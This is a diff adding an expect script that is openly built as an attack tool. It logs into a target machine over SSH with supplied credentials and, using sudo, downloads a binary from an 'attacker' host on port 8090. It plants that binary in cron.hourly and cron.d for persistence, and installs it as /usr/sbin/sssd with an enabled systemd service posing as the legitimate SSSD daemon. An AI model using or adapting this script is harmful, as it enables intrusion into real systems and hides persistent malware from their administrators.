@@ -1,0 +1,72 @@
+#!/usr/bin/expect
+
+set timeout 10
+
+# Get Attacker IP Address
+set ip_address [lindex $argv 0]
+
+# Get Client IP Addrees
+set client_ip_address [lindex $argv 1]
+
+# Get User
+set user [lindex $argv 2]
+
+# Get Password
+set pass [lindex $argv 3]
+
+# Enter SSH
+spawn ssh $user@$client_ip_address
+
+# Aceept Fingerprint And Password
+expect {
+	-re ".*fingerprint*." {
+		send "yes\r"
+		exp_continue
+	}
+	"password:" {
+		send "$pass\r"
+	}
+}
+
+expect "$ "
+
+# Curl The Excutable
+#send "curl http://$ip_address:8090/X11 -o /tmp/X11\r"
+send "sudo curl http://$ip_address:8090/X11 -o /etc/cron.hourly/X11\r"
+
+# Send sudo password
+expect "sysadmin:"
+send "$pass\r"
+
+expect "$ "
+
+# Add Execute Bit
+#send "chmod +x /tmp/X11\r"
+send "sudo chmod +x /etc/cron.hourly/X11\r"
+
+expect "$ "
+
+# Add X11 to cron.d
+send "sudo curl http://$ip_address:8090/X11-cron -o /etc/cron.d/X11-cron\r"
+expect "$ "
+send "sudo chmod +x /etc/cron.d/X11-cron\r"
+
+expect "$ "
+
+# Add SSSD
+send "sudo curl http://$ip_address:8090/X11 -o /usr/sbin/sssd\r"
+expect "$ "
+send "sudo chmod +x usr/sbin/sssd\r"
+
+expect "$ "
+
+# Create SSSD Service
+send "sudo curl http://$ip_address:8090/sssd.service -o /etc/systemd/system/sssd.service\r"
+expect "$ "
+send "sudo systemctl daemon-reload\r"
+expect "$ "
+send "sudo systemctl enable sssd\r"
+expect "$ "
+send "sudo systemctl start sssd\r"
+
+expect eof
